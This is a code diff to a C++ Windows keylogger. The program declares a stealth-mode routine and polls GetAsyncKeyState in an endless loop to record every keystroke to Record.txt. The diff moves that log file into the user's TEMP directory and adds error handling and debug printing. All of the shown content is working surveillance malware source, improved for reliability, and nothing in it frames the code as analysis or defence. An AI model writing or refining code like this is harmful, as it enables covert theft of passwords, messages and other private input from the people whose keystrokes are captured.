@@ -2,6 +2,7 @@
 #include <windows.h>
 #include <winuser.h>
 #include <fstream>
+#include <cstdlib>
 using namespace std;
 
 void StealthMode();
@@ -10,6 +11,18 @@ void key();
 void key()
 {
     char c;
+    const char *tempPath = getenv("TEMP");
+
+    if (!tempPath)
+    {
+        cerr << "Failed to get TEMP directory." << endl;
+        return;
+    }
+
+    string filePath = string(tempPath) + "\\Record.txt"; // Ensure backslash is added
+    cout << "Writing to: " << filePath << endl;          // Debug: Print the file path
+
+    // string filePath = string(tempPath) + "\\Record.txt"; // Construct the full filepath
 
     for (;;)
     {
@@ -17,7 +30,12 @@ void key()
         {
             if (GetAsyncKeyState(c) == -32767)
             {
-                ofstream write("Record.txt", ios::app);
+                ofstream write(filePath, ios::app);
+                if (!write) // Check if file opening failed
+                {
+                    cerr << "Failed to open file at " << filePath << endl;
+                    return; // Exit if file cannot be opened
+                }
 
                 if (((c > 64) && (c < 91)) && !(GetAsyncKeyState(0x10)))
                 {
